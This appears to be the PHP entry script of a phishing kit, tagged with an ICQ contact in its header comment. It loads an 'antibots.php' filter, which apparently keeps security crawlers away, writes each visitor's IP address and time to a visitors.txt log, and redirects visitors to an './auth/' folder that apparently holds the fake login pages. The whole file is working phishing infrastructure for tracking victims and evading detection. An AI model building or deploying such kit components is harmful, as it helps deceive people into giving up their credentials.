<?php
/* ------------------------ ICQ : 743688056 ------------------------- */
include("antibots.php");
$ipz=$_SERVER['REMOTE_ADDR'];
$date_time = @date('d/m/Y h:i a');																																																																							
        $s = fopen("./visitors.txt", "a+");
        fwrite($s, "[".$date_time."] - ".$ipz."\n\r");
        fclose($s);
            header("location:./auth/");
 ?>
 